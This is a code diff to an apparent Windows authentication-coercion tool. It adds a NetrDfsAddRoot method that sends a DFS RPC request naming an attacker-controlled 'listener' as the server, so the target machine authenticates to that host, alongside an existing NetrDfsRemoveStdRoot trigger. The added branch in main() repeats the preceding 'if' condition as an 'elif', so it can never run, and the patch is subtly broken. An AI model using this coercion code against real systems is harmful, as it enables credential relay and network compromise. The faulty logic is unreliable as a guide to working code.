@@ -92,6 +92,18 @@ class TriggerAuth():
 
         except  Exception as e:
             print(e)
+    def NetrDfsAddRoot(self, dce, listener):
+        print("[-] Sending NetrDfsAddRoot!")
+        try:
+            request = NetrDfsAddRoot()
+            request['ServerName'] = '%s\x00' % listener
+            request['RootShare'] = 'test\x00'
+            request['Comment'] = 'test\x00'
+            request['ApiFlags'] = 1
+            request.dump()
+            resp = dce.request(request)
+        except  Exception as e:
+            print(e)
 
 
 def main():
@@ -130,6 +142,9 @@ def main():
     if dce is not None:
         trigger.NetrDfsRemoveStdRoot(dce, options.listener)
         dce.disconnect()
+    elif dce is not None:
+        trigger.NetrDfsAddRoot(dce, options.listener)
+        dce.disconnect()        
     sys.exit()
 
 
